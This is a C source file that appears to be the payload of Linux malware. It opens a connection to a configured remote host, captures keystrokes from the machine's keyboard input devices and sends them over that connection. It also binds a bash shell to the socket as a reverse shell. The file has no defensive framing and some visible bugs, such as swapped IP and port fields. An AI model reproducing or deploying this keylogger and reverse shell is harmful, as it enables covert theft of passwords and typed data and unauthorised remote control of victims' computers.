
#include "payload.h"
#include "setup.h"
#include <bits/types/struct_timeval.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>

int setup_socket(settings_t *g_settings)
{
    int flag = 1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(atoi(g_settings->target_ip)),
        .sin_addr.s_addr = strcmp(g_settings->target_ip, DEFAULT_IP) != 0 ?
         inet_addr(g_settings->target_port) : INADDR_ANY
    };

    printf("[+] Initiating connection to %s:%s\n",
    g_settings->target_ip, g_settings->target_port);
    g_settings->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (g_settings->sockfd == -1) {
        printf("[!] Failure to build socket: %s\n", strerror(errno));
        return -1;
    } else if (setsockopt(g_settings->sockfd, SOL_SOCKET,
        SO_REUSEADDR | SO_REUSEPORT, &flag, sizeof(int)) < 0) {
        printf("[!] Failure to set socket options: %s\n", strerror(errno));
        return -1;
    } else if (connect(g_settings->sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] Failure to connect: %s\n", strerror(errno));
        return -1;
    }
    printf("[+] Connected!\n");
    return g_settings->sockfd;
}

SECTION(ELF_CODE)
int is_keyboard(const struct dirent *file)
{
    size_t len = strlen(file->d_name);

    return len > 3
    && file->d_name[len - 3] == 'k'
    && file->d_name[len - 2] == 'b'
    && file->d_name[len - 1] == 'd';
}

SECTION(ELF_CODE)
int *get_keyboards_fds(int *nb_fd)
{
    struct dirent **devices = NULL;
    int nb_paths = scandir(DIR_PATH, &devices, &is_keyboard, &alphasort);
    char *rpath = NULL;
    int *result = NULL;

    if (nb_paths < 0 ||
    !(result = malloc(sizeof(int) * (nb_paths + 1))) ||
    !(rpath = malloc(sizeof(char) * (BUFFER_SIZE+ 1))))
        return NULL;
    for (int i = 0; i < nb_paths; i++) {
        rpath = realpath(devices[i]->d_name, rpath);
        result[i] = open(rpath, O_RDONLY);
    }
    free(rpath);
    result[nb_paths] = -1;
    *nb_fd = nb_paths;
    return result;
}

SECTION(ELF_CODE)
bool is_shift(char c)
{
    return c == KEY_LEFTSHIFT || c == KEY_RIGHTSHIFT;
}

char *append(char *buffer, char *to_add)
{
    size_t new_len = 0;

    if (!buffer || !(*buffer))
        return strdup(to_add);
    new_len = strlen(buffer) + strlen(to_add);
    buffer = realloc(buffer, sizeof(char) * (new_len + 1));
    buffer = strcat(buffer, to_add);
    return buffer;
}

SECTION(ELF_CODE)
void log_single_keyboard(int fd, settings_t *s)
{
    char *buffer = NULL;
    static bool is_on_shift = false;
    int bytes_read = -1;
    struct input_event evt;
    struct sigaction reset;
    struct sigaction ignore = {
        .sa_handler = SIG_IGN,
        .sa_flags = 0
    };

    do {
        bytes_read = read(fd, &evt, sizeof(struct input_event));
        if (bytes_read < 0)
            break;
        else is_on_shift = is_shift(evt.code);

        if (evt.type == EV_KEY && evt.value == EV_KEY_PRESSED) {
            if (is_on_shift)
                buffer = append(buffer, SHIFT_KEYCODES[evt.code]);
            else buffer = append(buffer, KEYCODES[evt.code]);
        }
    } while (bytes_read < 0);

    sigemptyset(&ignore.sa_mask);
    sigaction(SIGPIPE, &ignore, &reset);
    dprintf(s->sockfd, "%s", buffer);
    sigaction(SIGPIPE, &reset, NULL);
}

SECTION(ELF_CODE)
void log_keys(settings_t *stg)
{
    int nb_fd = 0;
    int *fds = get_keyboards_fds(&nb_fd);

    struct timeval ts = {
        .tv_sec = 0,
        .tv_usec = 50000,
    };
    fd_set rs;
    int s_status = 0;

    if (!fds)
        return;
    while (1) {
        FD_ZERO(&rs);
        for (int i = 0; i < nb_fd; i++)
            FD_SET(fds[i], &rs);
        s_status = select(nb_fd, &rs, NULL, NULL, &ts);
        if (s_status < 1)
            continue;

        for (int i = 0; i < nb_fd; i++) {
            if (FD_ISSET(fds[i], &rs))
                log_single_keyboard(fds[i], stg);
        }
    }
    for (int i = 0; i < nb_fd; i++)
        close(fds[i]);
    free(fds);
}

SECTION(ELF_CODE)
void setup_payload(settings_t *stg)
{
    char * const argv[] = {"/bin/bash", NULL};
    pid_t pid = 0;

    stg->sockfd = setup_socket(stg);
    if (stg->sockfd == -1)
        return;

    pid = fork();
    if (pid == -1) {
        printf("[!] Failed to create a child\n");
    } else if (pid == 0) {
        printf("[+] Starting key logs...\n");
        log_keys(stg);
    } else {
        printf("[+] Starting revshell.\n");
        dup2(stg->sockfd, 0);
        dup2(stg->sockfd, 1);
        dup2(stg->sockfd, 2);
        execve("/bin/bash", argv, environ);
    }
}
